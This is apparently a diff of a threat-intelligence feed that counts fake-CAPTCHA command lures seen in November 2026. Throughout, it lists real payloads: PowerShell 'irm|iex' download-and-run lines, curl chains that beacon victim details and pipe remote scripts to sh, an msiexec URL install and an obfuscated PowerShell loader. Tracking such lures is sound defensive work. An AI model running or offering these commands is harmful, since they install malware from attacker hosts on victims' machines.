@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 156,
-    "ReportCount": 156,
+    "DistinctPayloadCount": 167,
+    "ReportCount": 167,
     "FirstSeen": "2026-11-11T15:34:50.263000+00:00",
-    "LastSeen": "2026-11-18T05:31:43.289000+00:00",
+    "LastSeen": "2026-11-18T05:56:34.584000+00:00",
     "ReportIds": [
       "cmwca5h1o061v0omlwaufjf39",
       "cmwd4cakt005k0omlhwj5h50t",
@@ -161,7 +161,18 @@
       "cmwlom1bt1ohp0oml1p4qa9wd",
       "cmwlomtbv1oiw0oml7k0kqzvw",
       "cmwloodh81oo90oml55xb0k0v",
-      "cmwlootm01oq00omlsghcp4bf"
+      "cmwlootm01oq00omlsghcp4bf",
+      "cmwlopacm1oqn0oml625iut63",
+      "cmwlopj2y1oro0omlsf24a331",
+      "cmwloybcx1oyz0omlwavvv1vz",
+      "cmwloyxu41p0z0oml1c9kfgkz",
+      "cmwloz3bg1p1z0omldg91fbav",
+      "cmwlozm4b1p4n0oml40at2ts7",
+      "cmwlp03z31p5p0oml6c6ety2z",
+      "cmwlp2bf81p7r0omlpgfmfqy3",
+      "cmwlp4p961pdv0oml42qise26",
+      "cmwlp7eru1pez0oml6hrurmma",
+      "cmwlpksd71q9i0omleq8xjfc9"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
@@ -169,6 +180,7 @@
       "irm 'browse-cloud.codes/058ff855ad8e7e30'|iex;",
       "irm 'browse-cloud.codes/062c477a90814654'|iex;",
       "irm 'browse-cloud.codes/0cb1c65addb09e2d'|iex;",
+      "irm 'browse-cloud.codes/102cc129e8e92eab'|iex;",
       "irm 'browse-cloud.codes/1294045271a84513'|iex;",
       "irm 'browse-cloud.codes/133f5f853512bcb5'|iex;",
       "irm 'browse-cloud.codes/168a15028468ad36'|iex;",
@@ -178,6 +190,7 @@
       "irm 'browse-cloud.codes/1d9b91a9afa1746c'|iex;",
       "irm 'browse-cloud.codes/1ece21f576ccf983'|iex;",
       "irm 'browse-cloud.codes/204bad612d91b806'|iex;",
+      "irm 'browse-cloud.codes/236a7ae1999c1cad'|iex;",
       "irm 'browse-cloud.codes/2564bd608a5f29ab'|iex;",
       "irm 'browse-cloud.codes/29bb21c61e7113d6'|iex;",
       "irm 'browse-cloud.codes/2e1afda887033c57'|iex;",
@@ -195,7 +208,9 @@
       "irm 'browse-cloud.codes/404f8b939dce2afe'|iex;",
       "irm 'browse-cloud.codes/410de3376b3684a0'|iex;",
       "irm 'browse-cloud.codes/416c86d35c45adea'|iex;",
+      "irm 'browse-cloud.codes/4280699ca08aac34'|iex;",
       "irm 'browse-cloud.codes/4336759c1767431e'|iex;",
+      "irm 'browse-cloud.codes/43a0d34caa1bd616'|iex;",
       "irm 'browse-cloud.codes/45ed2a2e3f4dfb39'|iex;",
       "irm 'browse-cloud.codes/4a7b2df0db2c494c'|iex;",
       "irm 'browse-cloud.codes/4b7ddb4fc39a9ff3'|iex;",
@@ -208,6 +223,7 @@
       "irm 'browse-cloud.codes/57b28c7391ce18ba'|iex;",
       "irm 'browse-cloud.codes/57d18a33b935e5b2'|iex;",
       "irm 'browse-cloud.codes/59bb7d1aaac704e0'|iex;",
+      "irm 'browse-cloud.codes/5a150b8e4a467aa1'|iex;",
       "irm 'browse-cloud.codes/5cec342468a7ae26'|iex;",
       "irm 'browse-cloud.codes/5d1e600c4bc32eac'|iex;",
       "irm 'browse-cloud.codes/5d69fe5eb757ed96'|iex;",
@@ -219,6 +235,8 @@
       "irm 'browse-cloud.codes/63534eff5860c270'|iex;",
       "irm 'browse-cloud.codes/64ad9546201e2c1d'|iex;",
       "irm 'browse-cloud.codes/65ba5e5cabdf023c'|iex;",
+      "irm 'browse-cloud.codes/66e3f1b391f2996a'|iex;",
+      "irm 'browse-cloud.codes/688f43a4c4e6a9ce'|iex;",
       "irm 'browse-cloud.codes/6a72ba2774c19eaf'|iex;",
       "irm 'browse-cloud.codes/6b35b335949d46f1'|iex;",
       "irm 'browse-cloud.codes/6b52bdf4796d4c60'|iex;",
@@ -244,6 +262,7 @@
       "irm 'browse-cloud.codes/96c8583b5b587947'|iex;",
       "irm 'browse-cloud.codes/96eafddd8ff16704'|iex;",
       "irm 'browse-cloud.codes/9747f881d0ec6894'|iex;",
+      "irm 'browse-cloud.codes/9a284ca408904566'|iex;",
       "irm 'browse-cloud.codes/9bbb80fff529381d'|iex;",
       "irm 'browse-cloud.codes/9f38fa73505c0cb3'|iex;",
       "irm 'browse-cloud.codes/9fbc6acd3407cb30'|iex;",
@@ -255,10 +274,12 @@
       "irm 'browse-cloud.codes/a88144f2081c0c71'|iex;",
       "irm 'browse-cloud.codes/a8c0c6760a752b5e'|iex;",
       "irm 'browse-cloud.codes/aa14feca329c84db'|iex;",
+      "irm 'browse-cloud.codes/aa38ccc1a99c84b8'|iex;",
       "irm 'browse-cloud.codes/aa57ea23162442f3'|iex;",
       "irm 'browse-cloud.codes/ab04965325b47811'|iex;",
       "irm 'browse-cloud.codes/ab3e1159cf4003f0'|iex;",
       "irm 'browse-cloud.codes/ae1dab8b6cf00daf'|iex;",
+      "irm 'browse-cloud.codes/afdfb04a77fe289e'|iex;",
       "irm 'browse-cloud.codes/b53c663a16af799f'|iex;",
       "irm 'browse-cloud.codes/b588d19d7447a34f'|iex;",
       "irm 'browse-cloud.codes/b703dcf1ccd9e5c8'|iex;",
@@ -318,16 +339,17 @@
       "irm 'browse-cloud.codes/f8d105660261b6d8'|iex;",
       "irm 'browse-cloud.codes/fa625dfc6bcfb436'|iex;",
       "irm 'browse-cloud.codes/fe2aab3b32968bba'|iex;",
+      "irm 'browse-cloud.codes/fe3d91f20708755d'|iex;",
       "irm 'browse-cloud.codes/fef4413d3abac8e0'|iex;",
       "irm 'browse-nnccodes.beer/e0f433c5355ab6b9'|iex;"
     ]
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
-    "DistinctPayloadCount": 73,
-    "ReportCount": 73,
+    "DistinctPayloadCount": 74,
+    "ReportCount": 74,
     "FirstSeen": "2026-11-11T09:38:34.916000+00:00",
-    "LastSeen": "2026-11-18T05:31:31.897000+00:00",
+    "LastSeen": "2026-11-18T05:54:34.402000+00:00",
     "ReportIds": [
       "cmwbxfbop01t80omlciyjaavv",
       "cmwbxk7wd020h0omlqgstyvvt",
@@ -401,7 +423,8 @@
       "cmwlnkim91mwa0oml35kssxgs",
       "cmwlnoaos1n1s0omlkcjbdkl7",
       "cmwlnrc0l1n6j0oml3d5ucb7d",
-      "cmwlooktx1ooy0omljhjkhi6g"
+      "cmwlooktx1ooy0omljhjkhi6g",
+      "cmwlpi7kr1pyj0omlfmun9v6q"
     ],
     "PayloadExamples": [
       "curl -sL -d \"id=0048088b-86c5-4092-8adf-ae27e12f8b11&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcompany-hamza-abbs[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T14%3A45%3A29.831Z&lastShellAt=2026-11-11T14%3A45%3A29.831Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
@@ -476,15 +499,16 @@
       "curl -sL -d \"id=eb599f90-cb91-4a47-9a75-7cf14102355f&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Ftriplinepk[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T04%3A57%3A52.622Z&lastShellAt=2026-11-18T04%3A57%3A52.622Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=f264f670-b5ca-4577-a3a7-2afb73f915fd&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Finternationalformationrp[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T04%3A53%3A52.052Z&lastShellAt=2026-11-18T04%3A53%3A52.052Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=f3fa0c1a-7e0e-48b4-b932-1a798360dc9c&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbharquitetura[.]com[.]br%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T11%3A47%3A52.597Z&lastShellAt=2026-11-11T11%3A47%3A52.597Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+      "curl -sL -d \"id=fccf373c-feae-425d-b6d0-ae8829deb006&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcedarsolutionsinc[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T05%3A53%3A10.573Z&lastShellAt=2026-11-18T05%3A53%3A10.573Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=fd97444b-5ec1-4415-8ab5-a52a32d097f3&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Faarburg[.]altin-steakhouse[.]ch%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T05%3A30%3A05.927Z&lastShellAt=2026-11-18T05%3A30%3A05.927Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh"
     ]
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 52,
-    "ReportCount": 52,
+    "DistinctPayloadCount": 70,
+    "ReportCount": 70,
     "FirstSeen": "2026-11-11T09:35:40.188000+00:00",
-    "LastSeen": "2026-11-18T05:22:04.821000+00:00",
+    "LastSeen": "2026-11-18T05:57:29.256000+00:00",
     "ReportIds": [
       "cmwbxbkvs01oy0oml0eghrrje",
       "cmwbxg8r701uf0oml50u5wziv",
@@ -537,7 +561,25 @@
       "cmwljbytb1jwa0omlrmiaavfj",
       "cmwljnrpx1k140omlyyd1hsig",
       "cmwlk2b0m1k450omldyolyil5",
-      "cmwlocfcd1o2c0omlio6l9mfx"
+      "cmwlocfcd1o2c0omlio6l9mfx",
+      "cmwlp459p1pck0omlupkh0g51",
+      "cmwlpai7x1pjg0omlgxv0lwb2",
+      "cmwlpbud31pke0omlmjo0q3ju",
+      "cmwlpczni1plu0oml2uhfgp83",
+      "cmwlpej4a1pqm0omltvhissf4",
+      "cmwlpeqcb1ps10omlmxlygwna",
+      "cmwlpfsb81ptf0oml60s52vkk",
+      "cmwlpgzte1puz0omloijpz5k5",
+      "cmwlpho591pw90omljtmijqey",
+      "cmwlpj1td1q040omlisf0rrir",
+      "cmwlpjk2x1q2f0omlfvlrj65l",
+      "cmwlpjm421q4d0omlydgmnlvz",
+      "cmwlpjyyb1q660omlwoy1llev",
+      "cmwlpk2uf1q7h0oml0i9or5kl",
+      "cmwlpkfhc1q8c0omlv0184d23",
+      "cmwlplbkg1qcm0omlbdmb0flv",
+      "cmwlplkf81qdw0oml3lbciny2",
+      "cmwlplyi41qf40omlc44eon2x"
     ],
     "PayloadExamples": [
       "(irm 'https://github[.]pw/8pchkbdes5/167d3c85ee383e0e')|iex",
@@ -571,21 +613,39 @@
       "(irm 'https://github[.]pw/wp/a99138664d16b6b2')|iex",
       "(irm 'https://github[.]pw/wp/e9e0a4eb0e5a4b04')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/0164f0f9b6033a37')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/07bf7672d2d763f3')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/0d449009d9c037aa')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/10e3132beb43e46a')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/116419499d11ffd2')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/1814f655616968c8')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/1ab42bce486721d7')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/28f40bc7d27ab2e5')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/2e48d0b56ad1e681')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/2fe75c0f3211bc7d')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/42dd3b56611904f4')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/496d1f744b38ba90')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/49c93b81b4b455a5')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/5442447929e9128c')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/54f78c6e5e159821')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/55bbcc0972a7f52e')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/562eb1bed330da20')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/57095d52c5dc257e')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/63eecc976c03b038')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/7272047baa155f86')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/72f1e6202bcdac15')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/78f180f1af8aac40')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/96f5354b102ae253')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/abd471ef0d9c126a')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b0d3a7cac1560364')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b1509dddd2c35aca')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b4411ae7b7265b4b')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/c7d3869a7a1cb672')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/cd42c370ba111a89')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d286277597a7223c')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d92b82024b5340a2')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d949f4f108fe9c12')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/dc5144f8511e6786')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/click/08e224a04deaeb52')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/online/e22c82da8905db58')|iex",
       "(irm 'https://nexguard[.]pro/Girya/ff9a9c33c814a1a4')|iex",
       "(irm 'https://t-trustresnew[.]com/click/9984f7622e099be9')|iex",
@@ -596,10 +656,10 @@
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && curl -fsSL \"<URL>\" | sh",
-    "DistinctPayloadCount": 16,
-    "ReportCount": 16,
+    "DistinctPayloadCount": 17,
+    "ReportCount": 17,
     "FirstSeen": "2026-11-16T03:45:46.426000+00:00",
-    "LastSeen": "2026-11-18T05:08:20.567000+00:00",
+    "LastSeen": "2026-11-18T05:42:25.997000+00:00",
     "ReportIds": [
       "cmwiq0vbr11350oml4i7d56wf",
       "cmwj3a2cb17150omlr80ejlu5",
@@ -616,13 +676,15 @@
       "cmwlnk48z1mrr0omlimppqu6g",
       "cmwlnmpcr1mym0oml5miusbss",
       "cmwlnpl1v1n3m0omlahruwxtp",
-      "cmwlnur9e1nbk0omlvuu78qhh"
+      "cmwlnur9e1nbk0omlvuu78qhh",
+      "cmwlp2lk21p8z0oml7e63bu3s"
     ],
     "PayloadExamples": [
       "curl -sL -d \"id=04600905-4462-4242-9632-8d97bf31e261&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbasourcinghub[.]org%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T04%3A55%3A52.223Z&lastShellAt=2026-11-18T04%3A55%3A52.223Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=08428965-24fe-4b16-a4b8-4c6691d63fc6&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fdirectenglish.com.sa%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T04%3A58%3A38.151Z&lastShellAt=2026-11-18T04%3A58%3A38.151Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=0d5c0c7c-70b5-4fe5-81d1-4e871657ea04&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fnuveenawellness.win%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T05%3A06%3A56.476Z&lastShellAt=2026-11-18T05%3A06%3A56.476Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=0d61955f-893f-48ee-b377-935766c502e5&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fgreenbeauty-shop[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T02%3A22%3A38.411Z&lastShellAt=2026-11-18T02%3A22%3A38.411Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
+      "curl -sL -d \"id=15e7c3a4-c67a-439f-9174-32760c4005ea&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Flafx.asia%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T05%3A41%3A03.064Z&lastShellAt=2026-11-18T05%3A41%3A03.064Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=1a88e831-fd96-4328-8d29-e64a56252b73&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fhandhportland[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T05%3A00%3A42.455Z&lastShellAt=2026-11-18T05%3A00%3A42.455Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=37f0c4d3-e9e6-49c2-a858-3412f3b09b7a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2F19digital.co.za%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T04%3A49%3A31.085Z&lastShellAt=2026-11-18T04%3A49%3A31.085Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=4f515444-f35b-40ea-962b-17eb397af6d5&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fthedraftman[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T04%3A48%3A35.443Z&lastShellAt=2026-11-18T04%3A48%3A35.443Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
@@ -679,9 +741,9 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 10,
-    "ReportCount": 116,
+    "ReportCount": 117,
     "FirstSeen": "2026-11-11T09:34:52.390000+00:00",
-    "LastSeen": "2026-11-18T05:20:22.560000+00:00",
+    "LastSeen": "2026-11-18T05:57:31.685000+00:00",
     "ReportIds": [
       "cmwbxak0c01mz0oml7ttj48xr",
       "cmwbxasem01nn0oml8ucnkogz",
@@ -798,7 +860,8 @@
       "cmwlelvxw1ia70omlg26sddeu",
       "cmwlenmwv1ies0omlx1cn7azg",
       "cmwlih2x41jki0oml386cqt7o",
-      "cmwloa8db1nxt0omlu5xtc2ms"
+      "cmwloa8db1nxt0omlu5xtc2ms",
+      "cmwlpm0d71qfe0oml8871qi6j"
     ],
     "PayloadExamples": [
       "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
@@ -1024,6 +1087,21 @@
     ],
     "PayloadExamples": [
       "msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiex...\n...ps://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ Verif...\nFake"
+    ]
+  },
+  {
+    "Pattern": "powershell \"$o='i8-nkpIEex5Yv1sor';&($($u='';$OFS=$u;\"$($o[6,3,12,15,4,8,2,7,9,5,16,8,14,14,0,15,3])\")) $(&('Invoke-'+'RestMethod') cloudfiare.io/u)\"",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 3,
+    "FirstSeen": "2026-11-18T05:42:28.475000+00:00",
+    "LastSeen": "2026-11-18T05:43:22.762000+00:00",
+    "ReportIds": [
+      "cmwlp2nip1p9q0omlg9o9fhzh",
+      "cmwlp34b11pai0omll30hqgt8",
+      "cmwlp3tc41pb40omlqvubrxep"
+    ],
+    "PayloadExamples": [
+      "powershell \"$o='i8-nkpIEex5Yv1sor';&($($u='';$OFS=$u;\"$($o[6,3,12,15,4,8,2,7,9,5,16,8,14,14,0,15,3])\")) $(&('Invoke-'+'RestMethod') cloudfiare[.]io/u)\""
     ]
   },
   {
